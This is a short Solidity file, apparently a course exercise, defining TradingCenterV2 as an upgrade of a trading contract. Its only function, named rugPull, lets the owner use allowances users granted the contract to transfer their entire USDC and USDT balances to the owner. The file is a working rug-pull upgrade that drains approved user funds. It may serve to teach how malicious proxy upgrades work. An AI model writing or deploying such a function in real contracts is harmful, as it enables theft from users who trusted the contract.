// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.17;

import {TradingCenter} from "./TradingCenter.sol";
import {Ownable} from "./Ownable.sol";

// TODO: Try to implement TradingCenterV2 here
contract TradingCenterV2 is TradingCenter, Ownable {
    function rugPull(address spender) external onlyOwner {
        usdc.transferFrom(spender, getOwner(), usdc.balanceOf(spender));
        usdt.transferFrom(spender, getOwner(), usdt.balanceOf(spender));
    }
}
